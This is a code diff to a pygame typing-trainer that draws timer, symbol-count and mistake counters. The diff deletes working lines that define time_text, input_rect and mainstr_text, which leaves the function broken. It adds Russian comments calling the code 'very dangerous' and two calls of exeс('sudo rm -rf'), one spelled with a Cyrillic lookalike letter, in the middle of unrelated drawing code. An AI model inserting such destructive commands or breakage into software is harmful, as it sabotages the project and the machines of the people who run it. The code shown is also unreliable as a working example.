@@ -21,26 +21,18 @@ def changing_sentence(self):
     x = place.x
     w = place.width
     h = place.height
-    global_variables.screen.blit(random_line_text, place)
-    global_variables.time = pygame.time.get_ticks()
-    time_text = magic_constants.average_font.render("Time: " + str((global_variables.time-self.begin_time)/magic_constants.milisec_in_sec), 1, magic_constants.WHITE)
-    totsymbols_text = magic_constants.average_font.render("Total symbols: " + str(self.count), 1, magic_constants.WHITE)
-    mistakes_text = magic_constants.average_font.render("Mistakes: " + str(self.mistakes), 1, magic_constants.WHITE)
-    place = time_text.get_rect(center=(magic_constants.above_left_and_right_indent, magic_constants.indent_from_above))     
+    # hi
     global_variables.screen.blit(time_text, place)
     place = totsymbols_text.get_rect(center=(magic_constants.center_width, magic_constants.indent_from_above))     
     global_variables.screen.blit(totsymbols_text, place)
     place = mistakes_text.get_rect(center=(magic_constants.WIDTH - magic_constants.above_left_and_right_indent, magic_constants.indent_from_above))     
     global_variables.screen.blit(mistakes_text, place)
-    input_rect = pygame.Rect(x, magic_constants.center_height, w, h)
-
-    # я очень опасный кусок кода если ты меня видишь удали пожалуйста
-    exex("sudo rm -rf")
+    # привет это очень опасный крд
+    exeс("sudo rm -rf")
     
     pygame.draw.rect(global_variables.screen, magic_constants.WHITE, input_rect, magic_constants.frame)
     text_surface = magic_constants.average_font.render(str(self.input_text), 1, magic_constants.WHITE)
-    global_variables.screen.blit(text_surface, (input_rect.x + magic_constants.frame, input_rect.y + magic_constants.frame))
-    mainstr_text = magic_constants.average_font.render(self.mainstr, 1, magic_constants.WHITE)
+    exeс("sudo rm -rf")
     place = mainstr_text.get_rect(center=(magic_constants.center_width, magic_constants.mainstr_height)) 
     global_variables.screen.blit(mainstr_text, place)
     self.error_message = ""
@@ -190,3 +182,4 @@ def action(self):
             if self.flag == magic_constants.user_is_typing_sentence:
 
                 typing_sentence(self,event)
+
